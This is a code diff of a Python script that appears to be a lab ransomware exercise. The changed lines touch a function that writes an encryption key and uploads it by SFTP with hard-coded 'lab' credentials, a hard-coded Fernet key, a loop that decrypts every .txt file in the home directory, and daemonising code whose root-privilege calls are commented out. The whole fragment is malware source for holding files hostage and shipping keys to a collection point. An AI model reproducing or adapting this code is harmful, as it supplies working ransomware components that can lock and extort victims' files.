@@ -49,7 +49,7 @@ def secureConnection():
 
 def sendKey(key):
     try:
-        with open(homeDirectory + "key.key", "wb") as keyFile:
+        with open(homeDirectory + "/key.key", "wb") as keyFile:
             keyFile.write(key)
     except Exception as e:
         print(e)
@@ -58,11 +58,11 @@ def sendKey(key):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect("localhost", username='lab', password='lab')
     sftp = ssh.open_sftp()
-    sftp.put(homeDirectory + "key.key", "/home/lab/clientKey.key")
+    sftp.put(homeDirectory + "/key.key", "/home/lab/clientKey.key")
 
 
 def getKey():
-    return "test"
+    return "ERnM7XAn6jXGLEC3894UB5JfgbDfK2CU0bNkcWub2Yc=".encode('ascii')
 
 
 if __name__ == '__main__':
@@ -75,7 +75,7 @@ if __name__ == '__main__':
         for file in os.listdir(os.path.expanduser(homeDirectory)):
             if file.endswith(".txt"):
                 filePath = os.path.join(homeDirectory, file)
-                f = Fernet(keyFile.read())
+                f = Fernet(keyFile)
                 with open(filePath, "rb") as fileContents:
                     data = fileContents.read()
                     decryptedData = f.decrypt(data)
@@ -93,8 +93,8 @@ if __name__ == '__main__':
         os.chdir('/')
         os.umask(0)
         os.setsid()
-        os.setuid(0)
-        os.setgid(0)
+        # os.setuid(0)
+        # os.setgid(0)
 
         signal.signal(signal.SIGCHLD, signalHandler)
 
